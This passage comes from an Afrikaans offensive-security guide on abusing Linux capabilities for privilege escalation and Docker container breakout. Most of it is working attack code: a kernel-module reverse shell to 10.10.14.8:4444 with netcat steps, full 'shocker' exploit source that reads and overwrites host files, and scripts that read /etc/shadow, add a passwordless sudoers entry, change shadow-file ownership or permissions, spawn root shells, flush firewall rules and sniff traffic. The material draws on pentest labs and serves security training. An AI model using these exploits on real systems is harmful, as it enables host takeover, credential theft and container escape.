Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Binne die vorige uitvoer kan jy sien dat die **SYS_MODULE** capability geaktiveer is.

**Skep** die **kernel module** wat ’n reverse shell gaan uitvoer, asook die **Makefile** om dit te **compileer**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Die leë karakter voor elke make-woord in die Makefile **moet ’n tab wees, nie spasies nie**!

Voer `make` uit om dit te kompileer.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Laastens, begin `nc` binne ’n shell en **laai die module** vanuit ’n ander shell; jy sal die shell in die nc-proses vaslê:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Die kode van hierdie tegniek is gekopieer uit die laboratorium van "Abusing SYS_MODULE Capability" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>

Nog ’n voorbeeld van hierdie tegniek kan gevind word by [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel ’n proses in staat om **toestemmings vir die lees van lêers en vir die lees en uitvoer van gidse te omseil**. Die primêre gebruik daarvan is om lêers te soek of te lees. Dit stel ’n proses egter ook in staat om die `open_by_handle_at(2)`-funksie te gebruik, wat toegang tot enige lêer kan verkry, insluitend lêers buite die proses se mount namespace. Die handle wat in `open_by_handle_at(2)` gebruik word, is veronderstel om ’n nie-deursigtige identifiseerder te wees wat deur `name_to_handle_at(2)` verkry word, maar dit kan sensitiewe inligting insluit, soos inode-nommers, wat vatbaar is vir manipulering. Die potensiaal vir uitbuiting van hierdie capability, veral in die konteks van Docker-containers, is deur Sebastian Krahmer met die shocker exploit gedemonstreer, soos [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) ontleed word.<sup>[[12]](#references)[[13]](#references)</sup>
**Dit beteken dat jy** **lêerleestoestemmingkontroles en gidslees-/uitvoertoestemmingkontroles kan omseil.**

**Voorbeeld met ’n binêre lêer**

Die binêre lêer sal enige lêer kan lees. Dus, as ’n lêer soos tar hierdie capability het, sal dit die shadow-lêer kan lees:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**Voorbeeld met binary2**

In hierdie geval veronderstel ons dat die **`python`** binary hierdie capability het. Om root-lêers te lys, kan jy doen:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
En om ’n lêer te lees, kon jy doen:
```python
print(open("/etc/shadow", "r").read())
```
**Voorbeeld in Environment (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die docker-container nagaan deur:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
In die vorige uitvoer kan jy sien dat die **DAC_READ_SEARCH** capability geaktiveer is. Gevolglik kan die container **processes debug**.

Jy kan leer hoe die volgende exploit werk by [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), maar kortliks laat **CAP_DAC_READ_SEARCH** ons nie net toe om deur die lêerstelsel te navigeer sonder permission checks nie, maar dit verwyder ook uitdruklik enige checks vir _**open_by_handle_at(2)**_ en **kan ons process toegang gee tot sensitiewe lêers wat deur ander processes oopgemaak is**.<sup>[[13]](#references)</sup>

Die oorspronklike exploit wat hierdie permissions misbruik om lêers vanaf die host te lees, kan hier gevind word: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), die volgende is ’n **modified version waarmee jy die lêer wat jy wil lees as die eerste argument kan aandui en dit na ’n lêer kan dump.**<sup>[[12]](#references)</sup>
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Die exploit moet 'n pointer vind na iets wat op die host gemount is. Die oorspronklike exploit het die lêer /.dockerinit gebruik, en hierdie aangepaste weergawe gebruik /etc/hostname. As die exploit nie werk nie, moet jy dalk 'n ander lêer stel. Om 'n lêer te vind wat op die host gemount is, voer eenvoudig die mount command uit:

![CAP SYS MODULE - CAP DAC READ SEARCH: Die exploit moet 'n pointer vind na iets wat op die host gemount is. Die oorspronklike exploit het die lêer /.dockerinit gebruik, en hierdie aangepaste weergawe gebruik...](<../../images/image (407) (1).png>)

**Die code van hierdie technique is gekopieer uit die laboratorium van "Abusing DAC_READ_SEARCH Capability" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Dit beteken dat jy write permission checks op enige lêer kan bypass, sodat jy enige lêer kan skryf.**

Daar is baie lêers wat jy kan **overwrite om privileges te escalate,** [**jy kan idees hier kry**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Voorbeeld met binary**

In hierdie voorbeeld het vim hierdie capability, sodat jy enige lêer soos _passwd_, _sudoers_ of _shadow_ kan modify:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Voorbeeld met binary 2**

In hierdie voorbeeld sal die **`python`** binary hierdie capability hê. Jy kan python gebruik om enige lêer te oorskryf:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Voorbeeld met omgewing + CAP_DAC_READ_SEARCH (Docker breakout)**

Jy kan die geaktiveerde capabilities binne die Docker-container nagaan deur:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Lees eerstens die vorige afdeling wat [**DAC_READ_SEARCH capability misbruik om willekeurige lêers van die gasheer te lees**](linux-capabilities.md#cap_dac_read_search) en **compile** die exploit.\
Compile dan **die volgende weergawe van die shocker exploit**, wat jou sal toelaat om **willekeurige lêers** binne die gasheer se lêerstelsel te **skryf**:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Om uit die Docker container te ontsnap, kan jy die lêers `/etc/shadow` en `/etc/passwd` vanaf die host **download**, ’n **new user** daarby **add**, en **`shocker_write`** gebruik om dit te oorskryf. Dan kan jy via **ssh** **access** verkry.

**Die kode van hierdie tegniek is gekopieer uit die laboratorium "Abusing DAC_OVERRIDE Capability" van** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Dit beteken dat dit moontlik is om die eienaarskap van enige lêer te verander.**

**Voorbeeld met binary**

Kom ons veronderstel die **`python`** binary het hierdie capability; jy kan die **owner** van die **shadow**-lêer **change**, die **root password** **change** en privileges eskaleer:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Of met die **`ruby`**-binary wat hierdie capability het:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Dit beteken dat dit moontlik is om die toestemmings van enige lêer te verander.**

**Voorbeeld met binary**

As Python hierdie capability het, kan jy die toestemmings van die shadow-lêer verander, **die root-wagwoord verander**, en privileges eskaleer:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Dit beteken dat dit moontlik is om die effektiewe gebruikers-ID van die geskepte proses te stel.**

**Voorbeeld met binary**

**As python hierdie capability het, kan jy dit baie maklik misbruik om privileges na root te eskaleer:**
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Nog 'n manier:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Dit beteken dat dit moontlik is om die effektiewe groep-ID van die geskepte proses in te stel.**

Daar is baie lêers wat jy kan **oorskryf om voorregte te eskaleer,** [**jy kan hier idees kry**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Voorbeeld met binary**

In hierdie geval moet jy soek na interessante lêers wat ’n groep kan lees, omdat jy jou as enige groep kan voordoen:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Sodra jy 'n lêer gevind het wat jy kan misbruik (deur dit te lees of te skryf) om voorregte te eskaleer, kan jy **'n shell kry wat die interessante groep naboots** met:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
In hierdie geval is die groep shadow nageboots, sodat jy die lêer `/etc/shadow` kan lees:
```bash
cat /etc/shadow
```
### Gekombineerde ketting: CAP_SETGID + CAP_CHOWN

Wanneer albei capabilities in dieselfde helper beskikbaar is, is ’n praktiese ketting:

1. Skakel EGID na `shadow` (of ’n ander bevoorregte groep).
2. Gebruik `chown` op `/etc/shadow` om jou UID te stel terwyl die groep `shadow` behou word.
3. Lees ’n teiken-hash en crack/pivot.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Dit vermy die behoefte aan volledige root direk en is dikwels voldoende om deur credential reuse te pivot.

As **docker** geïnstalleer is, kan jy die **docker group** **impersonate** en dit misbruik om met die [**docker socket** te kommunikeer en privileges te eskaleer](#writable-docker-socket).

## CAP_SETFCAP

**Dit beteken dat dit moontlik is om capabilities op lêers en prosesse te stel**

**Voorbeeld met binary**

As python hierdie **capability** het, kan jy dit baie maklik misbruik om privileges na root te eskaleer:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> Let daarop dat indien jy 'n nuwe capability aan die binary stel met CAP_SETFCAP, jy hierdie cap sal verloor.

Sodra jy [SETUID capability](linux-capabilities.md#cap_setuid) het, kan jy na die afdeling daarvan gaan om te sien hoe om privileges te eskaleer.

**Voorbeeld met environment (Docker breakout)**

By verstek word die capability **CAP_SETFCAP aan die proses binne die container in Docker gegee**. Jy kan dit nagaan deur iets soos die volgende te doen:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Hierdie capability laat toe om **enige ander capability aan binaries toe te ken**, dus kan ons dink aan **escaping** uit die container deur **enige van die ander capability breakouts** wat op hierdie bladsy genoem word, te misbruik.\
As jy egter probeer om byvoorbeeld die capabilities CAP_SYS_ADMIN en CAP_SYS_PTRACE aan die gdb-binary toe te ken, sal jy vind dat jy dit kan toeken, maar die **binary sal daarna nie kan uitvoer nie**:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Uit die dokumentasie](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Dit is 'n **beperkende superset vir die effektiewe capabilities** wat die thread mag aanvaar. Dit is ook 'n beperkende superset vir die capabilities wat deur 'n thread wat **nie die CAP_SETPCAP** capability in sy effektiewe stel het nie, by die inheri‐table stel gevoeg mag word._\
Dit lyk asof die Permitted capabilities dié beperk wat gebruik kan word.\
Docker ken egter ook die **CAP_SETPCAP** by verstek toe, dus kan jy moontlik **nuwe capabilities binne die inheritable stel instel**.\
In die dokumentasie van hierdie cap staan daar egter: _CAP_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
Dit lyk asof ons slegs capabilities uit die bounding stel by die inheritable stel kan voeg. Dit beteken dat **ons nie nuwe capabilities soos CAP_SYS_ADMIN of CAP_SYS_PTRACE in die inherit-stel kan plaas om privileges te eskaleer nie**.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) verskaf 'n aantal sensitiewe bewerkings, insluitend toegang tot `/dev/mem`, `/dev/kmem` of `/proc/kcore`, die wysiging van `mmap_min_addr`, toegang tot die `ioperm(2)`- en `iopl(2)`-stelseloproepe, en verskeie skyfopdragte. Die `FIBMAP ioctl(2)` word ook deur hierdie capability geaktiveer, wat in die [verlede](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) probleme veroorsaak het. Volgens die man page laat dit die houer ook toe om beskrywend `perform a range of device-specific operations on other devices`.

Dit kan nuttig wees vir **privilege escalation** en **Docker breakout.**

## CAP_KILL

**Dit beteken dat dit moontlik is om enige proses dood te maak.**

**Voorbeeld met binary**

Kom ons veronderstel die **`python`** binary het hierdie capability. As jy ook **'n diens- of socket-konfigurasielêer** (of enige konfigurasielêer wat met 'n diens verband hou) kon wysig, kon jy dit backdoor, en dan die proses wat met daardie diens verband hou, doodmaak en wag totdat die nuwe konfigurasielêer met jou backdoor uitgevoer word.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc met kill**

As jy kill capabilities het en daar ’n **node program is wat as root** (of as ’n ander gebruiker)loop, kan jy dit waarskynlik die **signal SIGUSR1** **stuur** en dit die **node debugger** laat oopmaak, waaraan jy kan koppel.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Dit beteken dat dit moontlik is om op enige port te luister (selfs op bevoorregte poorte).** Jy kan nie regstreeks met hierdie capability privileges eskaleer nie.

**Voorbeeld met binary**

As **`python`** hierdie capability het, sal dit op enige port kan luister en selfs van daar af aan enige ander port kan koppel (sommige dienste vereis verbindings vanaf poorte met spesifieke privileges)

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

Die [**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html)-vermoë laat prosesse toe om **RAW- en PACKET-sockets te skep**, wat hulle in staat stel om arbitrêre netwerkpakkette te genereer en te stuur. Dit kan tot sekuriteitsrisiko's in containerized omgewings lei, soos packet spoofing, traffic injection en die omseiling van netwerktoegangsbeheermaatreëls. Kwaadwillige akteurs kan dit uitbuit om met container-routing in te meng of host-netwerksekuriteit te kompromitteer, veral sonder voldoende firewall-beskerming. Daarbenewens is **CAP_NET_RAW** noodsaaklik vir privileged containers om bewerkings soos ping via RAW ICMP requests te ondersteun.

**Dit beteken dat dit moontlik is om traffic te sniff.** Jy kan nie privileges direk met hierdie vermoë eskaleer nie.

**Voorbeeld met binary**

As die binary **`tcpdump`** hierdie vermoë het, sal jy dit kan gebruik om netwerkinligting vas te vang.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Let daarop dat indien die **environment** hierdie capability verskaf, jy ook **`tcpdump`** kan gebruik om verkeer te sniff.

**Voorbeeld met binary 2**

Die volgende voorbeeld is **`python2`**-kode wat nuttig kan wees om verkeer van die "**lo**" (**localhost**)-interface te onderskep. Die kode is afkomstig van die lab "_The Basics: CAP-NET_BIND + NET_RAW_" by [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)<sup>[[1]](#references)</sup>.
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)-vermoë verleen aan die houer die mag om **netwerkkonfigurasies te wysig**, insluitend firewall-instellings, roeteringstabelle, socket-toestemmings en netwerkkoppelvlak-instellings binne die blootgestelde netwerknaamruimtes. Dit maak dit ook moontlik om **promiscuous mode** op netwerkkoppelvlakke te aktiveer, wat packet sniffing oor naamruimtes heen moontlik maak.

**Voorbeeld met binary**

Kom ons veronderstel dat die **python binary** hierdie vermoëns het.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**Dit beteken dat dit moontlik is om inode-attribute te wysig.** Jy kan nie direk met hierdie capability voorregte eskaleer nie.

**Voorbeeld met binary**

As jy vind dat 'n file immutable is en Python hierdie capability het, kan jy **die immutable-attribuut verwyder en die file wysigbaar maak:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> Let daarop dat hierdie immutable attribute gewoonlik gestel en verwyder word met:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

